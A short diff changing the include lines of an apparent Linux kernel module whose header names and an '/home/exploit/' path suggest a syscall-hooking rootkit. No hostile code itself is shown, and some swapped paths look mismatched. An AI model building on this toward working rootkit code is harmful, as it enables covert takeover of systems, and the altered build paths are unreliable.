@@ -21,19 +21,19 @@
 #include <linux/in.h>
 #include <linux/skbuff.h>
 #include <linux/netdevice.h>
-#include <linux/dirent.h>
+#include </usr/src/kernels/2.6.32-573.7.1.el6.i686/include/linux/dirent.h>
 #include <linux/proc_fs.h>
 #include <net/tcp.h>
-#include <asm/processor.h>
-#include <asm/uaccess.h>
-#include <asm/unistd.h>
-#include "config.h"
+#include </usr/src/kernels/2.6.32-573.7.1.el6.i686/include/config/acpi/processor.h>
+#include </usr/src/kernels/2.6.32-573.7.1.el6.i686/include/linux/uaccess.h>
+#include </usr/src/kernels/2.6.32-573.7.1.el6.i686/include/linux/unistd.h>
+#include "/home/exploit/linux/config.h"
 #include "data.h"
 #include "syscalls.h"
 #include "remoto.h"
 #include "kill.h"
 #include "read.h"
-#include "ls.h"
+#include "/home/exploit/linux/ls.h"
 
 #define ORIG_EXIT 19
 #define DIRECALL 42
